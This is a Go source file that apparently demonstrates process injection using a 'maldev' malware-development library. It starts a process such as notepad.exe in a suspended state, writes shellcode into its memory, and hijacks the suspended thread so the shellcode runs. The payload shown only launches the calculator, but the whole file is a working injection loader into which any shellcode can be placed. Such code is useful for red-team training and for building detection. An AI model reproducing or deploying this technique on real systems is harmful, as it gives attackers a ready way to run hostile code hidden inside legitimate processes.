package main

import (
	"flag"
	"fmt"

	"github.com/mortimus/maldev/pkg/maldev"
	"github.com/mortimus/maldev/pkg/shellcode"
)

func main() {
	maldev.DEBUG = true
	process := flag.String("process", "notepad.exe", "Process to inject into")
	flag.Parse()
	pid, hProcess, hThread, err := maldev.CreateSuspendedProcess(*process)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	maldev.Debugf("PID: %d\n", uintptr(*pid))
	maldev.Debugf("hProcess: %d\n", uintptr(*hProcess))
	maldev.Debugf("hThread: %d\n", uintptr(*hThread))
	sc := shellcode.Calc()
	pAddress, err := maldev.InjectShellcodeToRemoteProcess(*hProcess, sc, len(sc))
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	err = maldev.HijackThread(*hThread, pAddress)
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
}
